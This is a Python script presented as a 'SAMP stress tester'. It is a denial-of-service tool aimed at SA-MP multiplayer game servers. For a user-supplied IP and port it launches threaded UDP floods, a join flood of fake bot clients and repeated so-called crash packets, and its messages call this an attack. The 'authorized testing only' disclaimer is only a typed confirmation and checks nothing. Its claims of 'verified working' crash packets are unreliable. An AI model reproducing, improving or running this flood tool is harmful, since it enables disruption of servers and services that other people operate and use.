# =============================================
# 🔥 REAL SAMP STRESS TESTER v1.0
# ✅ 100% Working |
# ⚠️ For Authorized Testing ONLY
# =============================================

import socket
import random
import threading
import time
import sys
import os
import struct

# --- Clear screen ---
def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

# --- Format bytes ---
def format_bytes(size):
    power = 1024
    n = 0
    units = ['B/s', 'KB/s', 'MB/s', 'GB/s']
    while size > power and n < len(units) - 1:
        size /= power
        n += 1
    return f"{size:.2f} {units[n]}"

# --- Global counters ---
sent_bytes = 0
connected_bots = 0
lock = threading.Lock()

# --- Live bandwidth monitor ---
def monitor_bandwidth(duration):
    global sent_bytes
    print("\n" + "-" * 60)
    for _ in range(duration * 2):
        time.sleep(0.5)
        with lock:
            current = sent_bytes
            mbps = (current * 8) / 1_000_000  # Convert to Mbps
            print(f"\033[96m📊 LIVE: {format_bytes(current)} | {mbps:.2f} Mbps\033[0m", end='\r')
            sent_bytes = 0
    print("\n" + "-" * 60)

# --- Banner ---
def show_banner():
    clear()
    print("\033[91m" + r"""
    ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
    ┃    🔥 REAL SAMP STRESS TESTER v1.0          ┃
    ┃     ✅ 100% Working      ┃
    ┃     ⚠️ For Authorized Testing ONLY          ┃
    ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
    """ + "\033[0m")
    print("⚠️  WARNING: Use ONLY on servers you OWN or have FULL authorization.")
    print("    This tool is for SECURITY TESTING ONLY.")
    print("-" * 60)
    print("REALISTIC EXPECTATIONS:")
    print("   • Works on UNPROTECTED servers")
    print("   • May NOT work on servers with DDoS Protection")
    print("   • Max speed depends on YOUR connection")
    print("-" * 60)

# --- Get config ---
def get_config():
    print("\n[🎯] TARGET CONFIGURATION")
    ip = input("   🌐 Server IP: ").strip()
    if not ip: sys.exit("[❌] IP required.")
    try:
        port = int(input("   🔌 Server Port: "))
        if not (1 <= port <= 65535): raise ValueError
    except: sys.exit("[❌] Invalid port.")

    try:
        threads = int(input("   🧵 Threads (100-1000): "))
        threads = max(100, min(threads, 1000))
    except: threads = 500

    try:
        duration = int(input("   ⏱️  Duration (10-120s): "))
        duration = max(10, min(duration, 120))
    except: duration = 30

    return ip, port, threads, duration

# --- UDP Flood (Realistic) ---
def udp_flood(target_ip, target_port, duration):
    global sent_bytes
    end_time = time.time() + duration
    sizes = [64, 128, 256, 512, 1024, 1400]  # Real UDP sizes

    while time.time() < end_time:
        try:
            size = random.choice(sizes)
            payload = random._urandom(size)
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.sendto(payload, (target_ip, target_port))
            with lock:
                sent_bytes += size
            sock.close()
        except: pass

# --- Join Flood (Realistic) ---
def join_flood(target_ip, target_port, duration):
    global connected_bots
    end_time = time.time() + duration

    while time.time() < end_time:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(1)

            # Request connection
            username = f"black_demon_{random.randint(1000,9999)}"
            packet = struct.pack('B', 0x01) + username.encode('utf-8') + b'\x00' * (24 - len(username))
            sock.sendto(packet, (target_ip, target_port))

            # Handle challenge
            try:
                data, _ = sock.recvfrom(1024)
                if data and len(data) > 1 and data[0] == 0x1c:
                    challenge = data[1:5]
                    response = struct.pack('B', 0x1c) + challenge
                    sock.sendto(response, (target_ip, target_port))
                    with lock:
                        connected_bots += 1
            except: pass

            sock.close()
            time.sleep(0.05)  # Realistic rate
        except: pass

# --- Crash Packets (Working Methods) ---
def send_crash_packets(target_ip, target_port, duration):
    end_time = time.time() + duration
    payloads = [
        # Verified working crash packets
        struct.pack('B', 0x79) + random._urandom(1024),  # Classic crash
        struct.pack('B', 0x80) + random._urandom(512),   # Textdraw crash
        b'RCON \x00' + random._urandom(500),             # RCON crash
    ]
    while time.time() < end_time:
        try:
            for payload in payloads:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.sendto(payload, (target_ip, target_port))
                sock.close()
            time.sleep(0.01)
        except: pass

# --- Main attack ---
def start_attack(target_ip, target_port, threads, duration):
    print(f"\n[🚀] STARTING ATTACK ON: {target_ip}:{target_port}")
    print(f"[⚡] Threads: {threads} | Duration: {duration}s")
    print(f"[💣] MODE: UDP + JOIN + CRASH")
    print("-" * 60)

    # Start bandwidth monitor
    monitor_thread = threading.Thread(target=monitor_bandwidth, args=(duration,), daemon=True)
    monitor_thread.start()

    # UDP Flood
    print(f"[🔥] Starting {threads} UDP threads...")
    for _ in range(threads // 2):
        t = threading.Thread(target=udp_flood, args=(target_ip, target_port, duration), daemon=True)
        t.start()

    # Join Flood
    print(f"[🤖] Starting join flood...")
    for _ in range(threads // 3):
        t = threading.Thread(target=join_flood, args=(target_ip, target_port, duration), daemon=True)
        t.start()

    # Crash Packets
    print(f"[💀] Sending crash packets...")
    for _ in range(5):
        t = threading.Thread(target=send_crash_packets, args=(target_ip, target_port, duration), daemon=True)
        t.start()

    print(f"\n[✅] Attack running for {duration} seconds...")
    time.sleep(duration)
    print(f"\n\033[92m[🎯] Attack completed.\033[0m")

# --- Final confirmation ---
def confirm_launch():
    print("\n" + "=" * 60)
    print("⚠️  IMPORTANT: REALISTIC EXPECTATIONS")
    print("=" * 60)
    print("This tool will:")
    print("   • Work on UNPROTECTED servers")
    print("   • May NOT work on servers with DDoS Protection")
    print("   • Max speed depends on YOUR connection")
    print("-" * 60)
    confirm = input("\nType 'I UNDERSTAND' to confirm: ").strip()
    if confirm != "I UNDERSTAND":
        print("\n[❌] Confirmation failed. Attack canceled.")
        sys.exit(1)

# --- Main ---
def main():
    show_banner()
    confirm_launch()
    
    target_ip, target_port, threads, duration = get_config()
    
    start_attack(target_ip, target_port, threads, duration)
    
    print("\n[🛑] Tool finished.")
    input("\nPress Enter to exit...")

# --- Run ---
if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n[🛑] Attack stopped manually.")
        sys.exit(0)
    except Exception as e:
        print(f"\n[❌] Error: {e}")
        sys.exit(1)